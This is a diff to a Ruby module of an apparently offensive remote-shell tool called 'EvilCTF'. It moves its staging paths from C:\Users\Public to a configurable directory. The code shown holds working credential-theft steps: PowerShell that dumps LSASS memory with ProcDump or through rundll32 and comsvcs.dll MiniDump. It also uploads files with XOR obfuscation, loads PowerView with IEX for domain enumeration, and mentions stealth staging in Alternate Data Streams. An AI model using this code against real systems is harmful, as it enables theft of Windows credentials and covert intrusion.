@@ -3,6 +3,7 @@
 require 'monitor'
 require 'ostruct'
 require 'shellwords'
+require_relative 'staging'
 require_relative 'tools'
 require_relative 'execution'
 require_relative 'uploader'
@@ -288,7 +289,7 @@ module EvilCTF
 
         locate_ps = <<~PS
           try {
-            $files = Get-ChildItem -LiteralPath 'C:\\Users\\Public' -File -ErrorAction SilentlyContinue |
+            $files = Get-ChildItem -LiteralPath '#{EvilCTF::Staging.dir}' -File -ErrorAction SilentlyContinue |
               Where-Object { $_.Name -like 'lsass*.dmp*' } |
               Sort-Object LastWriteTime -Descending
             if ($files -and $files.Count -gt 0) {
@@ -315,11 +316,11 @@ module EvilCTF
           puts '[*] No dump from initial macro run; retrying ProcDump with explicit diagnostics...'
           procdump_retry_ps = <<~PS
             try {
-              $exe = 'C:\\Users\\Public\\procdump64.exe'
+              $exe = '#{EvilCTF::Staging.tool_path('procdump64.exe')}'
               if (!(Test-Path -LiteralPath $exe)) {
                 "RETRY_ERROR::ProcDump not found at $exe"
               } else {
-                $target = 'C:\\Users\\Public\\lsass_retry.dmp'
+                $target = '#{EvilCTF::Staging.tool_path('lsass_retry.dmp')}'
                 & $exe -accepteula -ma lsass.exe $target 2>&1 | ForEach-Object { $_.ToString() }
                 "RETRY_EXIT::$LASTEXITCODE"
               }
@@ -342,7 +343,7 @@ module EvilCTF
             try {
               $lsass = Get-Process -Name lsass -ErrorAction Stop | Select-Object -First 1
               $lsassPid = $lsass.Id
-              $out = 'C:\\Users\\Public\\lsass_comsvcs.dmp'
+              $out = '#{EvilCTF::Staging.tool_path('lsass_comsvcs.dmp')}'
               $args = "C:\\Windows\\System32\\comsvcs.dll, MiniDump $lsassPid $out full"
               $p = Start-Process -FilePath 'rundll32.exe' -ArgumentList $args -PassThru -Wait -WindowStyle Hidden
               "COMSVCS_EXIT::$($p.ExitCode)"
@@ -384,7 +385,7 @@ module EvilCTF
         next 'Usage: load_ps1 <local_ps1>' if path.empty?
         next "[-] Local file not found: #{path}" unless File.exist?(path)
 
-        remote_path = "C:\\Users\\Public\\#{File.basename(path)}"
+        remote_path = EvilCTF::Staging.tool_path(File.basename(path))
         upload = EvilCTF::Uploader.upload_file(local_path: path, remote_path: remote_path, shell: shell,
                                                xor_key: session_options[:xor_key])
         ok = upload.is_a?(Hash) ? upload[:ok] : upload
@@ -408,7 +409,7 @@ module EvilCTF
         local_path = tokens.shift
         next "[-] Local file not found: #{local_path}" unless File.exist?(local_path)
 
-        remote_path = "C:\\Users\\Public\\#{File.basename(local_path)}"
+        remote_path = EvilCTF::Staging.tool_path(File.basename(local_path))
         upload = EvilCTF::Uploader.upload_file(local_path: local_path, remote_path: remote_path, shell: shell,
                                                xor_key: session_options[:xor_key])
         ok = upload.is_a?(Hash) ? upload[:ok] : upload
@@ -434,7 +435,7 @@ module EvilCTF
         if t == 'dom'
           logger = session_options[:logger] || OpenStruct.new
           EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
-          EvilCTF::Execution.run(shell, "IEX (Get-Content 'C:\\Users\\Public\\PowerView.ps1' -Raw)", timeout: 120)
+          EvilCTF::Execution.run(shell, "IEX (Get-Content '#{EvilCTF::Staging.tool_path('PowerView.ps1')}' -Raw)", timeout: 120)
         end
 
         if t == 'sql'
@@ -451,7 +452,7 @@ module EvilCTF
         logger = session_options[:logger] || OpenStruct.new
         enum_cache = session_options[:enum_cache] ||= {}
         EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
-        EvilCTF::Execution.run(shell, "IEX (Get-Content 'C:\\Users\\Public\\PowerView.ps1' -Raw)", timeout: 120)
+        EvilCTF::Execution.run(shell, "IEX (Get-Content '#{EvilCTF::Staging.tool_path('PowerView.ps1')}' -Raw)", timeout: 120)
         EvilCTF::Enums.run_enumeration(shell, type: 'dom', cache: enum_cache, fresh: session_options[:fresh])
         ''
       end
@@ -552,7 +553,7 @@ module EvilCTF
 
         if key == 'all'
           puts '[*] Staging all tools...'
-          EvilCTF::Tools::TOOL_REGISTRY.each_key do |tool_key|
+          EvilCTF::Tools.tool_registry.each_key do |tool_key|
             staged = EvilCTF::Tools.safe_autostage(tool_key, shell, session_options, logger)
             next unless session_options[:auto_exec] && staged
 
@@ -565,7 +566,7 @@ module EvilCTF
           staged = EvilCTF::Tools.safe_autostage(key, shell, session_options, logger)
           if staged
             puts "[+] Tool '#{key}' staged successfully"
-            tool = EvilCTF::Tools::TOOL_REGISTRY[key]
+            tool = EvilCTF::Tools.tool_registry[key]
             if tool && tool[:recommended_remote]
               # Stealth staging deploys to an Alternate Data Stream; route those
               # through the stager executor, which knows how to launch streams.
